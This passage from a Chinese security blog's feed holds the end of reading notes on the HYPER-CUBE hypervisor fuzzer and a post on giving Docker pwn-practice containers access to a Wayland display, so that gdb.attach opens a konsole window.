模型捕获形如 <code>mov cr3</code> 这样的特权指令，但性能开销巨大，于是 Intel 和 AMD 都各自引入了自己的硬件辅助虚拟化支持</p><h3 id="2-Device-Emulation"><a href="#2-Device-Emulation" class="headerlink" title="2) Device Emulation"></a>2) Device Emulation</h3><p>hypervisor 还需要模拟包括中断控制器在内的标准硬件，其主要有两种交互机制：MMIO 与 port I&#x2F;O，不过 hypervisor 不需要中断 DMA 内存访问</p><p>图 1 给出一个通过 <em>trap and emulate</em> 模型实现设备虚拟化的例子（QEMU&#x2F;KVM）：</p><p><img src="https://s2.loli.net/2023/10/25/OwSxUy159cgsQo7.png" alt="Fig. 1: Device emulation and its trap and emulate handling of privilegedinstructions in KVM and QEMU."></p><h3 id="3-Para-Virtualization"><a href="#3-Para-Virtualization" class="headerlink" title="3) Para-Virtualization"></a>3) Para-Virtualization</h3><p>虚拟机并不需要直接接触到实际的硬件，<em>半虚拟化</em> （para-virtualization）由此诞生，这种技术本质上需要我们去修改 OS，例如 VirtIO 便提供了一个统一的虚拟设备协议，OS 只需要实现一套虚拟设备驱动即可</p><p>现代的硬件加速的（hardware-accelerated）虚拟化则引入了新的指令叫 <code>hypercall</code>，用来主动触发 <code>VM-exit</code> 以实现一些任务（以 Intel 为例为 <code>vmcall</code> 指令）</p><h2 id="D-Fuzzing-Hypervisor"><a href="#D-Fuzzing-Hypervisor" class="headerlink" title="D. Fuzzing Hypervisor"></a>D. Fuzzing Hypervisor</h2><p>对 hypervisor 的 fuzzing 存在接口繁多、重启开销大的挑战，目前绝大部分研究来自工业界，例如 <a href="https://www.blackhat.com/docs/eu-16/materials/eu-16-Li-When-Virtualization-Encounters-AFL-APortable-Virtual-Device-Fuzzing-Framework-WithAFL-wp.pdf.">Tang</a> 实现了一个定制于 QEMU 的 SeaBIOS 的 AFL 扩展，学术界则仅有一个 VDF</p><h1 id="0x03-Design"><a href="#0x03-Design" class="headerlink" title="0x03. Design"></a>0x03. Design</h1><h2 id="A-Threat-Model"><a href="#A-Threat-Model" class="headerlink" title="A. Threat Model"></a>A. Threat Model</h2><p>攻击者有着对虚拟机的完全控制权，其目的为获取宿主机上其他虚拟机或是宿主机本身的控制权，DoS 攻击也纳入考虑 </p><h2 id="B-Challenge-in-Fuzzing-Hypervisors"><a href="#B-Challenge-in-Fuzzing-Hypervisors" class="headerlink" title="B. Challenge in Fuzzing Hypervisors"></a>B. Challenge in Fuzzing Hypervisors</h2><p>如图 2 所示，hypervisor 与 guest 间的交互接口众多，且非所有接口都有文档，需要 fuzzer 能实现与 hypervisor 间的有意义交互；VM 中系统启动过程也可能影响漏洞寻找过程，但重启系统耗时较长；硬件加速也可能带来不确定性</p><p><img src="https://s2.loli.net/2023/10/27/kqSU9gYXdzChcFe.png" alt="Fig. 2: High-level overview of the system architecture of HYPER-CUBE"></p><h2 id="C-Architecture"><a href="#C-Architecture" class="headerlink" title="C. Architecture"></a>C. Architecture</h2><h3 id="1-High-Level-Overview"><a href="#1-High-Level-Overview" class="headerlink" title="1) High-Level Overview"></a>1) High-Level Overview</h3><p>文章中的 fuzzer 包含如图 2 所示的三个主要组成部分：</p><ul><li><code>HYPER-CUBE OS</code> 在虚拟机内启动并枚举硬件接口，定制的系统使得我们对 VM 有着完全的控制权限</li><li>随后启动的用来 fuzz hypervisor 的字节码解释器 <code>TESSERACT</code></li><li>一组额外的工具，用于向 <code>TESSERACT</code> 提供字节码流、反编译执行的字节码程序、使用如串口等接口观测 hypervisor</li></ul><p>这样的架构允许我们实现上文所述的三个目标：</p><ul><li><code>High Performance Fuzzing</code>：客制操作系统 <code>HYPER-CUBE OS</code> 比 COTS（Commercial Off-The-Shelf） OS 更轻量级，从而在 crash 后能快速重启系统；编译执行程序进行 fuzz 也较耗时，因此作者使用自制的运行在 VM 中 ring0 的 <code>TESSERACT</code> 字节码解释器，以 <em>fuzzer-friendly</em> 的方式设计字节码：最大化产生有用指令的可能性、对内存地址不作为指针而是作为大小与偏移值进行编码（<code>TESSERACT</code> 会记录那些有趣的内存区域）；为了提高生成合理字节码的概率，所有参数都被映射到模范围中</li><li><code>Generic High-Dimensional Fuzzing</code>：现有的 hypervisor fuzzer 通常关注于某一接口，而 <code>TESSERACT</code> 则可以与所有可用接口交互</li><li><code>Stable and Deterministic Fuzzing</code>：此前的 hypervisor fuzzer 基于 COTS OS 从而引入了大量属于系统本身的不确定性，作者开发的操作系统 <code>HYPER-CUBE OS</code> 则以对环境的控制权避免了这个问题，且能进行一些有趣的操作</li></ul><h3 id="2-HYPER-CUBE-OS"><a href="#2-HYPER-CUBE-OS" class="headerlink" title="2) HYPER-CUBE OS"></a>2) HYPER-CUBE OS</h3><p>客制操作系统 <code>HYPER-CUBE OS</code> 为该 fuzzer 的核心，其实现了 <a href="https://www.gnu.org/software/grub/manual/multiboot2/multiboot.html">multiboot 2 规范</a>，并为我们的 fuzzer （<code>TESSERACT</code>）提供了一个通用平台，其有着两个主要任务：物理内存管理与设备枚举，前者需要管理所有的物理内存，后者则需要枚举 MMIO 与 port I&#x2F;O 的地址范围，并与 PIC&#x2F;APIC 交互，有的信息（如 MMIO 区域）通过 BIOS&#x2F;UEFI 传递，而有的信息（如 I&#x2F;O 端口与 PCI 设备）则又需要手动枚举</p><h3 id="3-TESSERACT"><a href="#3-TESSERACT" class="headerlink" title="3) TESSERACT"></a>3) TESSERACT</h3><p><code>HYPER-CUBE OS</code> 启动后会与 hypervisor 进行随机交互，这通过自定义字节码解释器 <code>TESSERACT</code> 定义，字节码可以来自于 VM 外，也可以来自于该解释器内置的伪随机数生成器，字节码的设计形式使得任意字节串都是一个合法程序</p><p>解释器解码时会将所有的值模到一个范围中，根据 opcode 调用不同的处理函数（进行单个&#x2F;多个动作）；解释器还维护一组单个为 4k 页的会被被定期覆盖为随机数据的 scratch 区域，这使得 <code>TESSERACT</code> 可以在其上创建自定义数据结构作为输入</p><h3 id="4-External-Tools"><a href="#4-External-Tools" class="headerlink" title="4) External Tools"></a>4) External Tools</h3><p>该 fuzzer 的最后一部分为运行在 host 侧的三个独立的辅助工具（通常在 fuzzing 之后使用）：</p><ul><li>logger 在 fuzzing 时岚姐 VM 的串口通信并存储以供后续分析</li><li>minimization tool 在找到 bug 后使用同样的种子重新生成程序并在随机移除部分段后观测结果，算法收敛后通常能获得包含数十条指令的程序，出于调试目的我们还可以将 <code>TESSERACT</code> 作为独立的 ring 3 程序运行</li><li>decompiler 将给定的（最小化）字节码转换为等价的 C 程序以分析找到漏洞的字节流程序，这样的 C 程序可以被编译为 HYPER-CUBE OS 的一个模块或是插入到 COTS OS 内核驱动中进行调试</li></ul><h1 id="0x04-Implementation-Details"><a href="#0x04-Implementation-Details" class="headerlink" title="0x04. Implementation Details"></a>0x04. Implementation Details</h1><blockquote><p>这一节很多基础知识，懒得摘抄太多了</p></blockquote><h2 id="A-HYPER-CUBE-OS"><a href="#A-HYPER-CUBE-OS" class="headerlink" title="A. HYPER-CUBE OS"></a>A. HYPER-CUBE OS</h2><h3 id="1-Boot-Process"><a href="#1-Boot-Process" class="headerlink" title="1) Boot Process"></a>1) Boot Process</h3><p>在启动阶段固件会从不同的外设（称为 Option ROMs）中载入程序以检测硬件并生成数据信息，随后加载 bootloader 以装载内核，multiboot 标准被制定来标准化 bootloader （并扩展至第二代以支持 UEFI）以在不同 BIOS&#x2F;UEFI 间通用，遵循 multiboot2 的内核可以被构建为 ELF 文件，<code>HYPER-CUBE OS</code> 便基于 multiboot2 规范并使用 GRUB 进行引导，从而使得其可以通过传统 BIOS 或 UEFI 固件进行启动，且在入口点便进入保护模式</p><ul><li><code>Initializing Interrupts</code>：<code>HYPER-CUBE OS</code> 会配置 PIC&#x2F;APIC 以初始化所有基本的中断&#x2F;异常的 handlers，并通过 masking OS 内的所有终端寄存器以屏蔽了所有外部中断，从而确保 fuzzing 过程不会被中断</li></ul><h3 id="2-Memory-Management"><a href="#2-Memory-Management" class="headerlink" title="2) Memory Management"></a>2) Memory Management</h3><p>作者实现了一个单次分配一整张页面的简易堆管理器，减少了内存碎片并提高了<del>撸棒</del>健壮性，实际上仅在枚举设备时 <code>HYPER-CUBE OS</code> 会为 <code>TESSERACT</code> 分配少量内存，因此额外开销可以忽略不计</p><p>现代操作系统通常使用分页机制支撑虚拟空间，但一些任务（如页表和 MMIO）需要直接访问物理内存，因此 <code>HYPER-CUBE OS</code> 维护一个一对一直接映射到物理内存的区域（<code>0x0 ~ 0x100000</code>），此外由 BIOS&#x2F;UEFI 传来的可用物理内存信息会被用作内核堆，最后 <code>HYPER-CUBE OS</code> 会创建另一个对 MMIO 区域的重映射，内存布局如图 3 所示：</p><p><img src="https://s2.loli.net/2023/10/27/EiusOdrowH4zgSp.png" alt="Fig. 3: Virtual memory layout of HYPER-CUBE"></p><h3 id="3-Device-Enumeration"><a href="#3-Device-Enumeration" class="headerlink" title="3) Device Enumeration"></a>3) Device Enumeration</h3><p>PCI 这样的硬件设备或是 APIC 或 高精确事件计时器（High Precision Event Timer，HPET）可以将内部寄存器映射到物理内存上，访问对应的 MMIO 区域则可以直接影响这些设备的状态，<code>HYPER-CUBE OS</code> 会枚举可用来 fuzzing 的不同接口，这需要枚举所有外设所用的 MMIO 及 port I&#x2F;O 地址</p><ul><li><code>Core Components</code>：由 APIC 或 HPET 提供的 MMIO 区域信息通过名为 <code>高级配置与电源接口</code> （Advanced Configuration and Power Interface，ACPI）表的形式进行描述，HPET 与 APIC MMIO 区域的基址存放在对应的 ACPI 表中（由 multiboot bootloader 提供），ACPI 表中所有的基址指针都在 <code>TESSERACT</code> 中注册为 fuzzing 目标地址</li><li><code>PCI-/PCIe-Enumeration</code>：<code>HYPER-CUBE OS</code> 依赖于传统 PCI 配置 I&#x2F;O 接口或基于位于增强配置机制（<code>Enhanced Configuration Mechanism</code>，ECAM）基指针的 MMIO 区域的现代 PCI 配置空间进行 PCI 设备枚举，ECAM 信息同样存放在 ACPI 表中</li><li><code>ISA-Enumeration / I/O Port Probing</code>：ISA 设备没有系统的枚举与检测的办法，因此 <code>HYPER-CUBE OS</code> 会对所有的 2<sup>16</sup> 个端口进行读写，发生改变的端口值则被认为是一个模拟设备</li></ul><h2 id="B-TESSERACT"><a href="#B-TESSERACT" class="headerlink" title="B. TESSERACT"></a>B. TESSERACT</h2><p><code>TESSERACT</code> 是一个复杂指令集解释器，总的来说实现了如下指令：</p><p><img src="https://s2.loli.net/2023/10/27/6qHpPGwKkvshNR1.png" alt="image.png"></p><p>字节流输入将被 <code>TESSERACT</code> 解码为不同的指令操作，在没有外部字节码流作为输入的情况下其使用伪随机数生成器来生成随机指令（如图 4 所示），在找到造成崩溃的初始 PRNG 状态后，作者使用相同的状态重新生成相同的字节串（可能长达数百万到数千万条指令），并将其嵌入到 <code>HYPER-CUBE OS</code> 镜像中进行引导，若依然崩溃则会随机删除 50% 指令片段并重复此过程以获取最小字节串，随后通过反汇编器转为人类可读的 C 程序形式</p><p><img src="https://s2.loli.net/2023/10/27/JYXaqnIbLVBEy12.png" alt="Fig. 4: TESSERACT consuming a byte string provided either by a PRNG or an embedded payload. Upon receiving the byte string, TESSERACT decodes it into opcodes such as 1 and 2 . It then calls the handler that actually performs I/O operations."></p><h1 id="0x05-Evaluation"><a href="#0x05-Evaluation" class="headerlink" title="0x05. Evaluation"></a>0x05. Evaluation</h1><p>作者希望能够回答以下四个研究问题：</p><ul><li>使用 <code>HYPER-CUBE</code> 是否能够在不同 hypervisor 中发现新的漏洞？</li><li>是否能重新发现那些已知的漏洞（如 QEMU 的 CVE-2015-3456）？</li><li>与其他的 hypervisor fuzzer 相比在覆盖率方面如何？</li><li>与其他的 hypervisor fuzzer 相比在性能方面如何？</li></ul><blockquote><p>贴几个表看看实力，具体的原文就不摘抄了，反正很强就对了，建议看原论文</p></blockquote><p><img src="https://s2.loli.net/2023/10/27/Rti6dTquacA9WJU.png" alt="TABLE II: Reported bugs found by HYPER-CUBE."></p><p><img src="https://s2.loli.net/2023/10/27/rFPLTHKihf8VZ2k.png" alt="TABLE III: Previously known vulnerabilities in QEMU / KVM found by HYPER-CUBE (average time in seconds over 20 runs each ± standard deviation)."></p><p><img src="https://s2.loli.net/2023/10/27/NsWtpZwlAk2xJ6L.png" alt="TABLE IV: Branch coverage and bugs found by HYPER-CUBE and VDF"></p><p><img src="https://s2.loli.net/2023/10/27/Mz5sy1NQApVh6OF.png" alt="TABLE V: Throughput of TESSERACT vs. GCC (with -O0)"></p><p><img src="https://s2.loli.net/2023/10/27/oUwZFAtBHdISCPy.png" alt="TABLE VI: Boot time comparison using QEMU 4.0.1-rc4 ASAN (average over 20 runs each ± standard deviation)."></p><p><img src="https://s2.loli.net/2023/10/27/evFjpUbtR9TmZLE.png" alt="TABLE VII: Automatic emulator detection rate of HYPER-CUBE. #scanning indicates the number of interfaces identified by our scanning. #well-known denotes the number of ports that the scanning did not find, but were contained in our list of well-known ports. #baseline is the number of interfaces, as reported by the hypervisor."></p><h1 id="0x06-Related-Work"><a href="#0x06-Related-Work" class="headerlink" title="0x06. Related Work"></a>0x06. Related Work</h1><p>过去的项目使用客制操作系统来测试 hypervisor，例如 <a href="https://github.com/airbus-seclab/crashos">CrashOS</a> 是包含了一组手写测试用例的 OS，但不提供发现新漏洞的方法；Intel CHIPSEC 套件则提供了不同的 fuzz 模拟设备的组件；Ormandy 则写了一个用于在不同 hypervisor 中创建随机 I&#x2F;O 访问的 <a href="https://www.semanticscholar.org/paper/An-Empirical-Study-into-the-Security-Exposure-to-of-Ormandy/b67dc496b84010aa4f2a0f909fb3cb4d36ba78a0">fuzzer</a>；Henderson 等人则提出了通过修改开源 hypervisor 并提供 AFL 支持来 fuzz 特定模拟设备的<a href="https://hhannuaa.github.io/papers/VDF_raid17.pdf">方法</a>；Tang 等人则通过[在 QEMU 的 SeaBIOS 上实现接口](<a href="https://www.blackhat.com/docs/eu-16/materials/">https://www.blackhat.com/docs/eu-16/materials/</a><br>eu-16-Li-When-Virtualization-Encounters-AFL-APortable-Virtual-Device-Fuzzing-Framework-WithAFL-wp.pdf)以提供 AFL 与 QEMU 间的互相操作性；来自 MWR Labs 和微软安全研究与防御部门的 Amardeep Chana 则引入了用于模糊测试 Hyper-V hypercall（VMBus）的<a href="https://labs.mwrinfosecurity.com/blog/venturesinto-hyper-v-part-1-fuzzing-hypercalls/">模糊测试工具</a>（附加<a href="https://blogs.technet.microsoft.com/srd/2019/01/28/fuzzing-para-virtualizeddevices-in-hyper-v/">链接</a>）</p><h1 id="0x07-Discussion"><a href="#0x07-Discussion" class="headerlink" title="0x07. Discussion"></a>0x07. Discussion</h1><p>这个工具很强大，但仍有一些可以提升的点</p><h2 id="A-Coverage-Guided-Hypervisor-Fuzzing"><a href="#A-Coverage-Guided-Hypervisor-Fuzzing" class="headerlink" title="A. Coverage-Guided Hypervisor Fuzzing"></a>A. Coverage-Guided Hypervisor Fuzzing</h2><p>与覆盖率信息进行结合可能会提高发现漏洞的概率，为了发现新的覆盖范围或有趣行为，需要逐步构建 hypervisor 中的状态，而可能的操作空间巨大，让状态增长到有趣的事情发生（如 crash）似乎会极大增加吞吐量</p><h2 id="B-Hyper-V"><a href="#B-Hyper-V" class="headerlink" title="B. Hyper-V"></a>B. Hyper-V</h2><p><code>HYPER-CUBE</code> 暂不支持 <code>Hyper-V</code> ，因为其不支持 64 位 UEFI 引导（<code>Hyper-V</code> 要求操作系统以此模式进行引导）；同时 HYPER-CUBE 对半虚拟化的支持有限，目前只实现了不太可能单独触发有趣覆盖的通用操作</p><h1 id="0x08-Conclusion"><a href="#0x08-Conclusion" class="headerlink" title="0x08. Conclusion"></a>0x08. Conclusion</h1><blockquote><p>没啥好说的</p></blockquote>]]></content>
    
    
    <summary type="html">&lt;p&gt;hyper 的 不是 visor，是我 cube 哒！&lt;/p&gt;</summary>
    
    
    
    <category term="PAPER" scheme="https://arttnba3.github.io/categories/PAPER/"/>
    
    
    <category term="信息安全" scheme="https://arttnba3.github.io/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    <category term="FUZZ" scheme="https://arttnba3.github.io/tags/FUZZ/"/>
    
    <category term="论文笔记" scheme="https://arttnba3.github.io/tags/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0/"/>
    
    <category term="虚拟化" scheme="https://arttnba3.github.io/tags/%E8%99%9A%E6%8B%9F%E5%8C%96/"/>
    
    <category term="Qemu" scheme="https://arttnba3.github.io/tags/Qemu/"/>
    
  </entry>
  
  <entry>
    <title>【OPS.0x01】为 Docker 连接 Wayland 图形环境</title>
    <link href="https://arttnba3.github.io/2023/10/25/OPS-0X01-DOCKER_WAYLAND_GUI/"/>
    <id>https://arttnba3.github.io/2023/10/25/OPS-0X01-DOCKER_WAYLAND_GUI/</id>
    <published>2023-10-24T17:02:45.000Z</published>
    <updated>2024-02-22T19:31:40.000Z</updated>
    
    <content type="html"><![CDATA[<p>这一日，Docker 再入桌面 GUI 境界</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00. 一切开始之前"></a>0x00. 一切开始之前</h1><blockquote><p>如果你只是寻求 docker 接通 Wayland 跑图形界面的解决方案，不想看笔者吐槽的各种批话，请直接跳过这一小节 ：）</p><p>如果你想要的是 docker 接通显卡的解决方案，那你走错路了，这个方案在<a href="https://arttnba3.cn/2023/08/31/OPS-0X00-DOCKER_ON_SERVER/#0x02-%E5%88%9B%E5%BB%BA%E5%8F%AF%E4%BB%A5%E4%BD%BF%E7%94%A8%E6%98%BE%E5%8D%A1%E7%9A%84-docker-%E7%8E%AF%E5%A2%83">隔壁</a></p></blockquote><p>笔者大一刚开始学 Pwn 的时候就因环境问题而感到苦手，上一题的环境可能是 <code>Ubuntu 16.04</code> 带个 <code>glibc-2.23</code> 只有 <code>fastbin</code>，下一题可能又变成 <code>Ubuntu 18.04</code> 带个 <code>glibc-2.27</code> 又多一个 <code>tcache</code> ，然后笔者本地环境又是 <code>Ubuntu 20.04</code> 带个 <code>glibc-2.31</code> 的同时 <code>tcache</code> 又多带一个 key，对于那时候以 glibc heap 利用作为主流的 Pwn 题而言若是本地 libc 版本不同则根本没有办法很好地调试好打远程</p><p>通过 <code>LD_PRELOAD</code> 参数在程序执行前 <em>预先加载 libc</em> 或许某些程度上是一个可行的办法，至少 libc 大版本相同的情况下载入不同的小版本基本上是没问题的，但是由于不同系统环境中 ld 版本不同的缘故，对于跨 ld 版本加载不同版本的 libc 则又可能直接 segmentation fault 了</p><p>虽然 Linux 的用户环境并不似 Windows 那样有着强壮的二进制前向兼容性，但是用户环境依托于内核环境、依托于内核向用户态暴露的接口——系统调用，而这并不是会轻易发生变动以及兼容性破坏的一个东西，由此，通过<strong>重新开辟一个对应的新的用户环境的方式</strong>—— 即形如 <code>Docker</code> 这样的<strong>操作系统层上的虚拟化方案</strong>，我们便能非常简单地搭建不同的 Pwn 题所对应的原始环境</p><blockquote><p><del>当然，这里就不得不提<a href="https://arttnba3.cn/2021/05/20/PIECES-0X00-SHELL_OUTSIDE-0-LOST_UMBRELLA/#arttnba3-arttnba3-cn-x2F-cat-flag">某些连 libc 都不给的是人是鬼全靠猜的比赛</a>的含金量了</del></p></blockquote><p>但是 Docker 一直有一个问题就是<strong>默认是没有图形环境的</strong>，这意味着我们没法直接在 Docker 当中运行 GUI 程序，对于需要复杂堆风水等多次调试的 Pwn 题目而言则没办法像直接运行在主机上那样直接通过 <code>gdb.attach()</code> 弹一个伪终端窗口出来：</p><p><img src="https://s2.loli.net/2023/10/24/ogN4EqIUx9TVm6u.jpg" alt="感觉不如 lldb"></p><p><a href="https://github.com/tmux/tmux/wiki">TMUX</a> 为我们提供了一个比较好的 docker 中的多终端解决方案，当你在 tmux 中运行 exploit 执行到 <code>gdb.attach()</code> 这样需要一个新终端的命令时，tmux 可以无缝分割出一个新的窗口，通过额外指定 pwntools 中的 <code>context.terminal</code> 环境变量可以控制新窗口的分割位置：</p><p><img src="https://s2.loli.net/2023/10/24/i2XEPgZGlVse1W8.jpg" alt="是新终端吗？如新"></p><p>但是 tmux 的翻页手感终究是差点意思，不像图形化界面那样可以很方便地用滚轮滚来滚去，同时基于 GUI 窗口的跨行文本复制也会跨多个 tmux 窗口，打破了不同窗口的隔离性：</p><p><img src="https://s2.loli.net/2024/02/23/YJ6XD1qxU8jaVw2.png" alt="更重要的一点是笔者当时非常 sb 认为 tmux 不能翻页，后面才知道 ctrl+b 后按下 [ 就能通过 PgUp 和 PgDn 翻页]"></p><p>笔者当年的解决方案是直接开多个虚拟机，但用起来总感觉差点意思不说，还占用了大量的物理磁盘空间——笔者本科阶段前两年所用的电脑是<strong>机身只搭载了一块 512GB SSD 的 surface book 2</strong>——为什么这里要特别讲一下这个机型并不是因为笔者想要炫富，虽然说从价格而言 surface 系统产品和 MacBook 系列产品一样同属价格极高性价比极低的“高端产品”，但笔者当时是在某海鲜市场买的可能大于二手的机子，所以其实没有花太多钱，但和 MacBook 一样的是 surface 全系列产品<strong>没有办法自行更换包括内存与硬盘在内的任何部件</strong>，而即便是在海鲜市场寻宝的情况下笔者也买不起更大容量的版本，再加上笔者当时除了是个计算机科学爱好者以及网络空间安全专业本科生的身份以外还是半个画师加十六分之一个平面设计师（当然现在已经不是本科生了），装个 visual studio 加个 matlab 加上 jetbrains 全家桶再装个 adobe 半家桶（主要就用 PS 和 AI 还有个剪视频的叫啥👴已经记不得了）就已经把硬盘填得满满当当的了，各种杂七杂八的资料照片音乐视频啥的又要吃掉少说几十 GB，这个时候再塞几个平均十几 GB 的各种虚拟机（主力虚拟机所占用的硬盘空间超过100GB）无疑更是让本就不富裕的 <strong>512GB SSD</strong> 雪上加霜</p><blockquote><p>而笔者为什么选择买这样一台中看不中用的电脑是因为在初中的时候笔者看一本不知道叫啥的电子硬件相关的杂志中看到 <code>surface book</code> 的 <em>屏幕键盘可分离、独显放置在键盘中</em> 的这样一个前所未有的解决方案感到十分惊人加非常的帅气，于是就一直心心念念想要买一台这样的本子，高中时期笔者换过三台不同的平板电脑二合一产品（当然，都是从某海鲜市场淘来的，且基本上是卖了上一台才买下一台），其中第一台是 surface 3 而第三台是 surface pro 3，当时的主要用途是拿来日常刷刷 OI 、写点小说 <del>（那么这里就不得不简单帮忙推广一下某不知名墨姓作家所写的<a href="https://www.qidian.com/book/1027074530/">《从零开始的 CTFer 生活》</a> 这部小说了虽然一直在咕咕咕）</del> 玩一些轻量游戏，体感其实还行</p><blockquote><p>当然现在微软的 surface 系列产品已经能够初步地自行更换硬盘，虽然是充满槽点的 <code>2230</code> 规格，但是和隔壁某水果品牌相比已经好得不得了了</p><blockquote><p>但是各项性能又被隔壁秒成渣渣了，微软你在干什么啊微软（恼）</p><p><del>但其实仔细一想这不应该是Intel的锅么，wintel联盟依托答辩了👊</del></p></blockquote></blockquote><p>以及 surface 系统产品一直有一个噱头就是有个触控笔可以画画，也就是自带数位屏，这也是这个产品一直以来最吸引笔者的一点，虽然微软最初给大家呈上来的只是一坨闻着香吃着臭的答辩，但笔者一直希望随着产品不断迭代，微软能够把这个功能给真正做好，就算达不到 wacom 上万块钱的数位屏相的高度至少也要和国产的一千出头的数位屏掰个手腕的程度，可惜<strong>哪怕是一直到今天最新的 surface pro 9 这一代产品，其绘画手感依旧比不过几千块钱的 iPad ，甚至比不过200块出头的国产数位板</strong>（当然笔者只买了 surface pro 8 没有买 surface pro 9 因为微软非常 SB 地把 3.5mm 耳机接口这个天顶星科技给砍掉了并且性能和续航和 8 代相比并没有什么提升简而言之又是挤牙膏的一代，但笔者有去微软线下门店亲自尝试过最新一代，绘画手感依旧一坨答辩）</p></blockquote><p>虽然 surface book 2 无法更换硬盘的特性让笔者非常痛苦，但仔细想来还是老罗的那句名言——<code>又不是不能用</code>，硬盘空间想办法腾一腾多开好几个虚拟机其实没什么不好，毕竟省去了折腾 docker 的麻烦就一万个值，于是笔者日渐习惯每天在不同虚拟机之间跳来跳去</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231125222853.png" alt="你知道我要说什么.png"></p><p>不过这个问题并没有折磨笔者太长的时间，在玩了将近一个学期的用户态 Pwn 学了各种不同的 house 之后笔者感觉 glibc pwn 在技术上基本上已经玩不出什么新的有意思的花样了，于是选择了 all in Linux kernel pwn，只需要用 QEMU 去跑虚拟机，gdb 可以直接连上 QEMU 的端口进行调试，也不依赖于某些特定的 glibc 环境（虽然后面玩虚拟机逃逸又用到了不过这是后话了），于是当初搭建的几个用户态 Pwn 环境的虚拟机就慢慢用不到了， <em>现在已经被笔者逐一打包扔到备份硬盘当中</em></p><p>而在 2023 年的今天，笔者又想趁着闲暇时间再业余小玩一下用户态的 Pwn（比赛大概率不一定会专门打了，最多就看到 corCTF 这样的优质比赛会去做做他们的内核题，一些比较有意思的的用户态 Pwn 题最多可能赛后会复现之类的），那么环境以及各种 libc（包括 glibc 、tclibc、musl，<del>👴其实没想明白 musl 为啥会在 CTF 里流行起来，是没活了🐎</del>）又重新变为笔者需要面对的问题之一，而彼时同时跑好几个虚拟机的解决方案未免太过于小丑🤡，因此笔者决定找到一个能够在 docker 当中执行 <code>gdb.attach()</code> 时直接在宿主机中弹出一个窗口的办法</p><blockquote><p>写了这么多没用的批话，突然感觉这一篇其实应该放到 <a href="https://arttnba3.cn/categories/PIECES/">PIECES</a> 分类 而非 <a href="https://arttnba3.cn/categories/OPS/">OPS</a> ，但仔细想想其实笔者真正要讲的核心内容其实是 docker 的一个小知识，所以还是放 OPS 分类下或许会更加合适一些</p></blockquote><h1 id="0x01-为-Docker-接入-Wayland-环境"><a href="#0x01-为-Docker-接入-Wayland-环境" class="headerlink" title="0x01. 为 Docker 接入 Wayland 环境"></a>0x01. 为 Docker 接入 Wayland 环境</h1><blockquote><p>笔者所用的图形服务为 Wayland，因此本篇不会讲 X11 该怎么配置（毕竟已经有很多讲这个的<a href="https://gist.github.com/turekt/71f6950bc9f048daaeb69479845b672b">文章</a>了，<del>，以及都什么年代了还在用传统图形服务</del>）</p></blockquote><p>配置的办法其实很简单，我们只需要在启动容器时额外添加一些参数即可，下面是一个简单的例子：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker build -t pwnenv_ubuntu20 .</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker run -d -p <span class="hljs-string">&quot;2222:22&quot;</span> \</span><br><span class="language-bash">--name=pwnenv_ubuntu20 \</span><br><span class="language-bash">-e XDG_RUNTIME_DIR=/tmp \</span><br><span class="language-bash">-e DISPLAY=<span class="hljs-variable">$DISPLAY</span> \</span><br><span class="language-bash">-e WAYLAND_DISPLAY=<span class="hljs-variable">$WAYLAND_DISPLAY</span> \</span><br><span class="language-bash">-v <span class="hljs-variable">$XDG_RUNTIME_DIR</span>/<span class="hljs-variable">$WAYLAND_DISPLAY</span>:/tmp/<span class="hljs-variable">$WAYLAND_DISPLAY</span> \</span><br><span class="language-bash">-e QT_QPA_PLATFORM=wayland \</span><br><span class="language-bash">pwnenv_ubuntu20</span><br></code></pre></td></tr></table></figure><blockquote><p><del>别问👴这些参数是什么意思，自己查嗷</del></p></blockquote><p>启动之后容器其实就完成对 Wayland 服务的接入了，这里我们简单写一个 QT 小程序看看实力：</p><p><img src="https://s2.loli.net/2023/10/25/bsER7NLVfD3Oq28.png" alt="libEGL 的报错懒得管了，反正日常使用没啥影响"></p><p>现在我们的 docker 就已经成功接入 Host 侧的图形服务了：）</p><h1 id="0x02-让-gdb-attach-弹出一个新的图形窗口"><a href="#0x02-让-gdb-attach-弹出一个新的图形窗口" class="headerlink" title="0x02. 让 gdb.attach() 弹出一个新的图形窗口"></a>0x02. 让 gdb.attach() 弹出一个新的图形窗口</h1><p>这个其实也很简单，笔者用的是 KDE 桌面，所以先在容器里装一个 <code>konsole</code> ，如果你用的是 Gnome 则可以装个 <code>gnome-terminal</code>：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt install konsole</span><br></code></pre></td></tr></table></figure><p>之后在 pwntools 调用 gdb 之前将全局变量 <code>context.terminal</code> 的值设为如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">context.terminal = [<span class="hljs-string">&#x27;konsole&#x27;</span>, <span class="hljs-string">&#x27;-e&#x27;</span>, <span class="hljs-string">&#x27;sh&#x27;</span>, <span class="hljs-string">&#x27;-c&#x27;</span>]<br></code></pre></td></tr></table></figure><p>之后就能像调试本地原生进程那样在调试 docker 里的进程的时候弹出一个新的 gdb 图形窗口了 ：）</p><p><img src="https://s2.loli.net/2023/10/25/fKS5bQUizjakCAr.jpg" alt="yattaze"></p><h1 id="0xFF-What’s-more…"><a href="#0xFF-What’s-more…" class="headerlink" title="0xFF. What’s more…"></a>0xFF. What’s more…</h1><p>最后给出一个笔者自用的开箱即用的 docker pwn 环境的 Dockerfile，有需要的可以自取：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 